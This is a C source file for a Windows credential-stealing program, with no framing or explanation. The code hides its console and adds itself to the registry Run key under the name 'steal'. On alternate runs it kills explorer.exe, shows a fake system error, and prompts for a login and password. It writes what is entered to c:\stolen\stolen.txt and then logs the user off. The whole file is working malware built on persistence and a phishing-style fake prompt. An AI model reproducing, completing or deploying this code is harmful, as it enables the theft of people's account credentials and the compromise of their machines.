#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <string.h>

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    FILE *myfile;
    int flag = 0;
    HKEY hKey;
    LPTSTR check;

    DWORD len = sizeof(check);
    char path[1000] = {0};
    RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS,
                 &hKey);
    GetModuleFileName(NULL, path, 1000);

    RegSetValueEx(hKey, TEXT("steal"), NULL, REG_SZ, (LPBYTE) path, (DWORD) (lstrlen(path) + 1) * sizeof(TCHAR));

    RegCloseKey(hKey);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("tmp"), 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {

        RegCreateKey(HKEY_CURRENT_USER, TEXT("tmp"), &hKey);

        LPCTSTR value = "0";

        RegSetValueEx(hKey, TEXT("tmp"), NULL, REG_SZ, (LPBYTE) value, (DWORD) (lstrlen(value) + 1) * sizeof(TCHAR));

    } else {

        RegQueryValueEx(hKey, TEXT("tmp"), NULL, NULL, (LPBYTE) &check, &len);

        LPCTSTR value1 = "1";

        LPCTSTR value0 = "0";

        if ((char) check == '0') {

            RegSetValueEx(hKey, TEXT("tmp"), NULL, REG_SZ, (LPBYTE) value1,
                          (DWORD) (lstrlen(value1) + 1) * sizeof(TCHAR));

            RegCloseKey(hKey);

            flag = 1;

        } else {

            RegSetValueEx(hKey, TEXT("tmp"), NULL, REG_SZ, (LPBYTE) value0,
                          (DWORD) (lstrlen(value0) + 1) * sizeof(TCHAR));

            RegCloseKey(hKey);

        }

    }

    if (flag) {

        char login[64] = {0};

        char password[64] = {0};

        myfile = fopen("c:\\stolen\\stolen.txt", "a+");

        system("TASKKILL /F /IM explorer.exe");

        if (MessageBox(hWnd, L"Windows System Error.", L"System error", MB_OK) == 1)

            ShowWindow(hWnd, SW_SHOW);

        printf("Enter login:");

        scanf("%s", &login);

        fputs("login: ", myfile);

        fputs(login, myfile);

        fputs("\n", myfile);

        printf("Enter password:");

        scanf("%s", &password);

        fputs("password: ", myfile);

        fputs(password, myfile);

        fputs("\n", myfile);

        fclose(myfile);

        ShowWindow(hWnd, SW_HIDE);

        if (MessageBox(hWnd, L"Wrong login or password. Try again.", L"System error", MB_OK) == 1);

        ExitWindowsEx(EWX_LOGOFF, 0);

    }

}